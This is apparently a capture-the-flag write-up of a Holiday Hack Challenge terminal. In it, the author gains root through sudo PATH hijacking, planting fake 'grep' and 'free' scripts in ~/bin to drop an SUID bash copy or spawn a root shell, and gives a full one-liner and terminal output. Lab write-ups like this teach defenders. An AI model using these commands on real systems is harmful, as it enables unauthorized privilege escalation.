Neighborhood Watch Bypass

Difficulty: 1/5

Objective : Assist Kyle at the old data center with a fire alarm that just won't chill.


Task: 

Go to the Data Center
( The route can be kinda confusing with a gate being around the building.. so just click on the door space and your 
character will auto-route )

<img width="874" height="578" alt="image" src="https://github.com/user-attachments/assets/9bd87282-238d-40ba-aedb-21454d906f96" />

<img width="775" height="535" alt="image" src="https://github.com/user-attachments/assets/90afbcfb-39fd-4367-9923-c2eb86155749" />

Terminal:

```
🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨
              DOSIS NEIGHBORHOOD FIRE ALARM SYSTEM - LOCKOUT MODE
🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨

🚨 EMERGENCY ALERT: Fire alarm system admin access has been compromised! 🚨
The fire safety systems are experiencing interference and 
admin privileges have been mysteriously revoked. The neighborhood's fire 
protection infrastructure is at risk!

⚠️ CURRENT STATUS: Limited to standard user access only
🔒 FIRE SAFETY SYSTEMS: Partially operational but restricted
🎯 MISSION CRITICAL: Restore full fire alarm system control

Your mission: Find a way to bypass the current restrictions and elevate to 
fire safety admin privileges. Once you regain full access, run the special 
command `/etc/firealarm/restore_fire_alarm` to restore complete fire alarm system control and 
protect the Dosis neighborhood from potential emergencies.

🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨

🏠 chiuser @ Dosis Neighborhood ~ 🔍 $
```

```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ sudo -l
Matching Defaults entries for chiuser on 4e6ab3b36a93:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    secure_path=/home/chiuser/bin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+="API_ENDPOINT API_PORT RESOURCE_ID HHCUSERNAME", env_keep+=PATH

User chiuser may run the following commands on 4e6ab3b36a93:
    (root) NOPASSWD: /usr/local/bin/system_status.sh
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ cat /usr/local/bin/system_status.sh
#!/bin/bash
echo "=== Dosis Neighborhood Fire Alarm System Status ==="
echo "Fire alarm system monitoring active..."
echo ""
echo "System resources (for alarm monitoring):" 
free -h
echo -e "\nDisk usage (alarm logs and recordings):"
df -h
echo -e "\nActive fire department connections:"
w
echo -e "\nFire alarm monitoring processes:"
ps aux | grep -E "(alarm|fire|monitor|safety)" | head -5 || echo "No active fire monitoring processes detected"
echo ""
echo "🔥 Fire Safety Status: All systems operational"
echo "🚨 Emergency Response: Ready"
echo "📍 Coverage Area: Dosis Neighborhood (all sectors)"
```

Method 1 (But cant complete SSL error: Dropping a root shell binary

Make a copy of `/bin/bash` with SUID bit set

1. Replace fake grep with:

```
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > ~/bin/grep
chmod +x ~/bin/grep
```
```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > ~/bin/grep
chmod +x ~/bin/grep
```

This will copy the `/bin/bash` to `/tmp/rootbash` and set the SUID bit to execute with root privileges.

2. Run the script again:

```
sudo /usr/local/bin/system_status.sh
```
```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ sudo /usr/local/bin/system_status.sh
=== Dosis Neighborhood Fire Alarm System Status ===
Fire alarm system monitoring active...

System resources (for alarm monitoring):
               total        used        free      shared  buff/cache   available
Mem:            31Gi       2.3Gi        24Gi       2.0Mi       5.0Gi        28Gi
Swap:             0B          0B          0B

Disk usage (alarm logs and recordings):
Filesystem      Size  Used Avail Use% Mounted on
overlay         296G   16G  268G   6% /
tmpfs            64M     0   64M   0% /dev
shm              64M     0   64M   0% /dev/shm
/dev/sda1       296G   16G  268G   6% /etc/hosts
tmpfs            16G     0   16G   0% /proc/acpi
tmpfs            16G     0   16G   0% /sys/firmware

Active fire department connections:
 19:36:27 up 1 day, 22:08,  0 users,  load average: 0.45, 0.23, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

Fire alarm monitoring processes:

🔥 Fire Safety Status: All systems operational
🚨 Emergency Response: Ready
📍 Coverage Area: Dosis Neighborhood (all sectors)
```

3. After the script completes, execute SUID shell and become root user:
```
/tmp/rootbash -p
```
```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ /tmp/rootbash -p
rootbash-5.1#
```
Run next command to restore full control of the fire alarm system:

```
rootbash-5.1# /etc/firealarm/restore_fire_alarm
🔥🚨 FIRE ALARM SYSTEM: Attempting to restore admin privileges...
🔒 BYPASSING SECURITY RESTRICTIONS...
📡 Connecting to fire safety control center: https://2025.holidayhackchallenge.com:443/turnstile?rid=1fa7e5fe-a041-4d33-bf78-33f32d435ae8
🚨 CRITICAL ERROR: Unable to connect to fire safety control center!
💥 Error details: Can't connect to HTTPS URL because the SSL module is not available.
🔥 Fire alarm system remains in lockout mode!

🔥🚨 FIRE ALARM SYSTEM RESTORATION COMPLETE 🚨🔥
rootbash-5.1# 
```

Method 2: 

```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ sudo -l
Matching Defaults entries for chiuser on 65dcb021853c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    secure_path=/home/chiuser/bin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+="API_ENDPOINT API_PORT RESOURCE_ID HHCUSERNAME", env_keep+=PATH

User chiuser may run the following commands on 65dcb021853c:
    (root) NOPASSWD: /usr/local/bin/system_status.sh
```

```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ cat /usr/local/bin/system_status.sh
#!/bin/bash
echo "=== Dosis Neighborhood Fire Alarm System Status ==="
echo "Fire alarm system monitoring active..."
echo ""
echo "System resources (for alarm monitoring):" 
free -h
echo -e "\nDisk usage (alarm logs and recordings):"
df -h
echo -e "\nActive fire department connections:"
w
echo -e "\nFire alarm monitoring processes:"
ps aux | grep -E "(alarm|fire|monitor|safety)" | head -5 || echo "No active fire monitoring processes detected"
echo ""
echo "🔥 Fire Safety Status: All systems operational"
echo "🚨 Emergency Response: Ready"
echo "📍 Coverage Area: Dosis Neighborhood (all sectors)"
```

Check command resolution order: 
```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ bash -c 'type -a free'
free is /usr/bin/free
free is /bin/free
```

Create the malicious fake free binary:

```
echo "/bin/bash" > ~/bin/free
chmod +x ~/bin/free
```
```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ echo "/bin/bash" > ~/bin/free
chmod +x ~/bin/free
```

Exploit via default sudo behavior:
```
sudo /usr/local/bin/system_status.sh
```

```
🏠 chiuser @ Dosis Neighborhood ~ 🔍 $ sudo /usr/local/bin/system_status.sh
=== Dosis Neighborhood Fire Alarm System Status ===
Fire alarm system monitoring active...

System resources (for alarm monitoring):
root@65dcb021853c:/home/chiuser# 
```

Or one liner of the whole script to root: 
```
echo "/bin/bash" > ~/bin/free && chmod +x ~/bin/free && sudo /usr/local/bin/system_status.sh
```

Run next command to restore full control of the fire alarm system:

```
/etc/firealarm/restore_fire_alarm
```

```
root@65dcb021853c:/home/chiuser# /etc/firealarm/restore_fire_alarm
🔥🚨 FIRE ALARM SYSTEM: Attempting to restore admin privileges...
🔒 BYPASSING SECURITY RESTRICTIONS...
📡 Connecting to fire safety control center: https://2025.holidayhackchallenge.com:443/turnstile?rid=e3666ecc-74d3-4d9c-9869-011e50718297
🎯 SUCCESS! Fire alarm system admin access RESTORED!
🚨 DOSIS NEIGHBORHOOD FIRE PROTECTION: FULLY OPERATIONAL
✅ All fire safety systems are now under proper administrative control
🔥 Emergency response capabilities: ACTIVE
🏠 Neighborhood fire protection: SECURED

======================================================================
   CONGRATULATIONS! You've successfully restored fire alarm system
   administrative control and protected the Dosis neighborhood!
======================================================================

🔥🚨 FIRE ALARM SYSTEM RESTORATION COMPLETE 🚨🔥
root@65dcb021853c:/home/chiuser#
```




























